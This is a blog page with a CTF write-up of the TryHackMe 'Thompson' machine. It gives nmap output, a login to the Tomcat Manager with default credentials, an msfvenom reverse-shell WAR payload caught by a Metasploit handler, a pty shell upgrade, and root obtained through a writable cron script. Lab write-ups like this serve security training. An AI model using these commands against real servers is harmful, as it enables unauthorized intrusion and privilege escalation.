<!doctype html><html lang=en>
<head>
<title>
Thompson - Write Up - Español ::
Lanfran02 - Blog — Where write-ups are made.
</title><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Nivel Creador     Aquí Fácil stuxnet    Reconocimiento Como siempre, ejecutemos nmap para ver qué puertos están abiertos.
╰─ lanfran@parrot ❯ map 10.10.128.244 ─╯ [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 13:43 CEST Nmap scan report for 10.10.128.244 Host is up (0.10s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/posts/thompson/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/posts/thompson/cover.png">
<meta name=twitter:title content="Thompson - Write Up - Español">
<meta name=twitter:description content="Máquina de nivel fácil en TryHackMe.">
<meta property="og:title" content="Thompson - Write Up - Español">
<meta property="og:description" content="Máquina de nivel fácil en TryHackMe.">
<meta property="og:type" content="article">
<meta property="og:url" content="/posts/thompson/"><meta property="og:image" content="/posts/thompson/cover.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-07-04T13:39:34+02:00">
<meta property="article:modified_time" content="2021-07-04T13:39:34+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga("create","G-3T7DYCWC0W","auto"),ga("send","pageview"))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head><body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/about>About</a></li><li><a href=/es/>Español</a></li><ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li><ul class="menu__sub-inner-more hidden">
<li><a href=/tags/hackthebox/>HTB</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile">
<li><a href=/about>About</a></li><li><a href=/es/>Español</a></li><li><a href=/tags/hackthebox/>HTB</a></li><li><a href=/tags/tryhackme/>THM</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header><div class=content>
<div class=post>
<h1 class=post-title>Thompson - Write Up - Español</h1><div class=post-meta>
<span class=post-date>
2021-07-04
</span>
<span class=post-author>— Written by Lanfran02</span>
<span class=post-read-time>— 3 min read</span>
</div><span class=post-tags>
<a href=/tags/tomcat/>#tomcat</a>&nbsp;
<a href=/tags/misconfigured/>#misconfigured</a>&nbsp;
<a href=/tags/msfconsole/>#msfconsole</a>&nbsp;
<a href=/tags/java/>#java</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/posts/thompson/cover.png alt="Thompson - Write Up - Español">
</figure><div class=post-content>
<h2>Table of Contents</h2><aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconocimiento>Reconocimiento</a></li><li><a href=#acceso-inicial---usuario>Acceso inicial - Usuario</a></li><li><a href=#root>Root</a></li></ul></nav></aside><table>
<thead>
<tr>
<th>Link</th><th>Nivel</th><th>Creador</th></tr></thead><tbody>
<tr>
<td><a href=https://tryhackme.com/room/bsidesgtthompson>Aquí</a></td><td>Fácil</td><td><a href=https://tryhackme.com/p/stuxnet>stuxnet</a></td></tr></tbody></table><h2 id=reconocimiento>Reconocimiento</h2><p>Como siempre, ejecutemos <code>nmap</code> para ver qué puertos están abiertos.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>╰─ lanfran@parrot ❯ map 10.10.128.244                                                                                              ─╯
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
</span></span><span style=display:flex><span>Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-07-04 13:43 CEST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.128.244
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.10s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> closed ports
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>8009/tcp open  ajp13   Apache Jserv <span style=color:#f92672>(</span>Protocol v1.3<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_ajp-methods: Failed to get a valid response <span style=color:#66d9ef>for</span> the OPTION request
</span></span><span style=display:flex><span>8080/tcp open  http    Apache Tomcat 8.5.5
</span></span><span style=display:flex><span>|_http-favicon: Apache Tomcat
</span></span><span style=display:flex><span>|_http-title: Apache Tomcat/8.5.5
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 35.03 seconds
</span></span></code></pre></div><p>As the name and cover picture of the room indicate, the machine is running an Apache Tomcat server on port 8080.</p><h2 id=acceso-inicial---usuario>Acceso inicial - Usuario</h2><p>We get the default Tomcat page, and also we can go to <code>Manager App</code> tab.</p><p>Maybe if we try with the defaults credentials for Tomcat??
<em>tomcat:s3cret</em></p><p>YES! We are inside!
<img src=foothold.png alt=Foothold></p><p>And inside here, we can upload a <code>.war</code> file!</p><p>So let&rsquo;s run <code>msfconsole</code> and <code>msfvenom</code> to create a payload!</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#Creating the payload</span>
</span></span><span style=display:flex><span>╰─ lanfran@parrot ❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style=color:#f92672>=</span>tun0 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>5555</span> -f war &gt; shell.war                                ─╯
</span></span><span style=display:flex><span>Payload size: <span style=color:#ae81ff>1091</span> bytes
</span></span><span style=display:flex><span>Final size of war file: <span style=color:#ae81ff>1091</span> bytes
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#Running Metasploit to handle the reverse connection</span>
</span></span><span style=display:flex><span>msf6 &gt; use exploit/multi/handler
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using configured payload generic/shell_reverse_tcp
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set payload java/jsp_shell_reverse_tcp
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span>&gt; java/jsp_shell_reverse_tcp
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set LHOST tun0
</span></span><span style=display:flex><span>LHOST <span style=color:#f92672>=</span>&gt; tun0
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; set LPORT <span style=color:#ae81ff>5555</span>
</span></span><span style=display:flex><span>LPORT <span style=color:#f92672>=</span>&gt; <span style=color:#ae81ff>5555</span>
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; options 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Module options <span style=color:#f92672>(</span>exploit/multi/handler<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name  Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----  ---------------  --------  -----------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>java/jsp_shell_reverse_tcp<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Name   Current Setting  Required  Description
</span></span><span style=display:flex><span>   ----   ---------------  --------  -----------
</span></span><span style=display:flex><span>   LHOST  tun0             yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   LPORT  <span style=color:#ae81ff>5555</span>             yes       The listen port
</span></span><span style=display:flex><span>   SHELL                   no        The system shell to use.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Exploit target:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>   Id  Name
</span></span><span style=display:flex><span>   --  ----
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>0</span>   Wildcard Target
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; run
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 10.9.6.21:5555
</span></span></code></pre></div><p>Now let&rsquo;s upload our <code>shell.war</code> file.</p><p>And navigate to the &ldquo;rare&rdquo; filename. In my case it was <code>http://10.10.128.244:8080/hgkFDt6wiHIUB29WWEON5PA/</code></p><p>After that, we should have a new shell in Metasploit.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Command shell session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.9.6.21:5555 -&gt; 10.10.128.244:34468<span style=color:#f92672>)</span> at 2021-07-04 13:57:31 +0200
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>id
</span></span><span style=display:flex><span>uid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>tomcat<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>tomcat<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1001<span style=color:#f92672>(</span>tomcat<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>Let&rsquo;s upgrade out shell with python.</p><p><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></p><p>Great! We can now read the user&rsquo;s flag.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tomcat@ubuntu:/home/jack$ cat user.txt
</span></span><span style=display:flex><span>3<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>f
</span></span></code></pre></div><h2 id=root>Root</h2><p>There&rsquo;s a cron job running with root&rsquo;s privs.</p><p>So let&rsquo;s go to <code>/home/jack</code> and copy the root&rsquo;s flag to a file in our home directory.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tomcat@ubuntu:/home/jack$ echo <span style=color:#e6db74>&#34;cat /root/root.txt &gt; test.txt&#34;</span> &gt; id.sh
</span></span><span style=display:flex><span>tomcat@ubuntu:/home/jack$ cat id.sh
</span></span><span style=display:flex><span>cat /root/root.txt &gt; test.txt
</span></span></code></pre></div><p>After a minute, we get the root flag in test.txt</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tomcat@ubuntu:/home/jack$ cat test.txt            
</span></span><span style=display:flex><span>d<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>a
</span></span></code></pre></div><p>¡Y hemos &ldquo;rooteado&rdquo; la máquina!</p><p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p></div><div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Read other posts</span>
<hr>
</div><div class=pagination__buttons>
<span class="button previous">
<a href=/posts/library/>
<span class=button__icon>←</span>
<span class=button__text>Library - Write Up</span>
</a>
</span>
<span class="button next">
<a href=/posts/cat-pictures/>
<span class=button__text>Cat Pictures - Write Up</span>
<span class=button__icon>→</span>
</a>
</span>
</div></div><div id=hyvor-talk-view></div><script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
</div></div><footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div></div></footer><script src=/assets/main.js></script>
<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(e=>{mediumZoom(e,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
<script type=module src=/assets/ionicons/ionicons.esm.js></script>
<script nomodule src=/assets/ionicons/ionicons.js></script>
</div><script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-3T7DYCWC0W",{anonymize_ip:!1})}</script>
</body></html>